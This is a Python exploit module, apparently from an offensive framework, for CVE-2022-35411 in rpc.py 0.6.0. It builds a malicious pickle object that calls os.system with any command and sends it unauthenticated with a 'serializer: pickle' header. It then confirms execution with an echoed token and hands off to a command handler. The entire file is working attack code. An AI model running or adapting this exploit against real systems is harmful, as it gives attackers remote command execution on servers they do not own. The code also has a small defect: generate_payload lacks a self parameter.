from deathnote_module import *
from lib.http.http_client import Http_client
from lib.exploit.handler import Handler
import pickle

class Module(Exploit, Http_client, Handler):
        

    __info__ = {
        'name': "rpc.py 0.6.0 - RCE",
        'description': "rpc.py through 0.6.0 allows Remote Code Execution because an unpickle occurs when the 'serializer: pickle'"\
                        "HTTP header is sent. In other words, although JSON (not Pickle) is the default data format, an unauthenticated "\
                        "client can cause the data to be processed with unpickle.",
        'cve': '2022-35411',
        'platform': 'linux',
        'payload': {
            'default': 'nopayload',
            }			
        }	

    def generate_payload(cmd):
        
        class PickleRce(object):
            def __reduce__(self):
                import os
                return os.system, (cmd,)

        payload = pickle.dumps(PickleRce())
        return payload

    def check_execute(self):
        
        token = self.random_text(10)
        r = self.execute(f"echo {token}")
        if token in r:
            return True
        return False

    def execute(self, cmd):
        
        data = self.generate_payload(cmd)
        r = self.http_request(
                            method="POST",
                            headers={"serializer": "pickle"},
                            data=data)
        return r.content
        
    def run(self):
        if self.check_execute():
            self.handler_execute()
        else:
            self.not_vulnerable()      